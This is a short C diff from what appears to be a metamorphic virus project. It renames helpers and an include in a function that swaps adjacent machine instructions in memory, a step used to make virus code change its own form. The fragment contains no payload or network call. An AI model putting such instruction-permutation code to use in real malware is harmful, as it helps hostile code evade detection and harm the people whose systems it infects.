@@ -14,7 +14,7 @@
 #include <stddef.h>
 
 #include "compiler_utils.h"
-#include "disassemble.h"
+#include "disasm.h"
 #include "utils.h"
 
 #ifdef DEBUG
@@ -52,20 +52,20 @@ static void	permutate_neighbors(struct s_instruction *a, struct s_instruction *b
 	// check if actually neighbours!
 	if (a->addr + a->length != b->addr)
 	{
-		famine_exit(errors(ERR_VIRUS, _ERR_IMPOSSIBLE));
+		sys_exit(errors(ERR_VIRUS, _ERR_IMPOSSIBLE));
 	}
 #endif
 
 	// backup 1st
 	uint8_t	swap_code[INSTRUCTION_MAXLEN];
-	ft_memcpy(swap_code, a->addr, a->length);
+	memcpy(swap_code, a->addr, a->length);
 
 	// copy b in a
-	ft_memcpy(a->addr, b->addr, b->length);
+	memcpy(a->addr, b->addr, b->length);
 
 	// copy a after that
 	void	*after_b = a->addr + b->length;
-	ft_memcpy(after_b, swap_code, a->length);
+	memcpy(after_b, swap_code, a->length);
 
 	// reassign addresses
 	b->addr = a->addr;
